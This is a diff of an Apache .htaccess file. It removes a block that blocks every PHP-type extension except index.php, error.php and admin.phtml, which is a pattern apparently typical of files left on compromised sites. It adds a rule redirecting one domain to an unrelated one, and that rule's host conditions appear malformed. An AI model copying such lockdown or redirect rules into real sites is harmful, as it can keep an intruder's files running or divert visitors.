@@ -1,13 +1,4 @@
-Options -Indexes
-
-<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
-Order allow,deny
-Deny from all
-</FilesMatch>
-
-<FilesMatch "^(index.php|error.php|admin.phtml)$">
-Order allow,deny
-Allow from all
-</FilesMatch>
-		
-DirectoryIndex index.php
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^unikgaul.com/ [NC,OR]
+RewriteCond %{HTTP_HOST} ^www.unikgaul.com/ [NC]
+RewriteRule ^(.*)$ https://swjournal.az/$1 [L,R=301,NC]
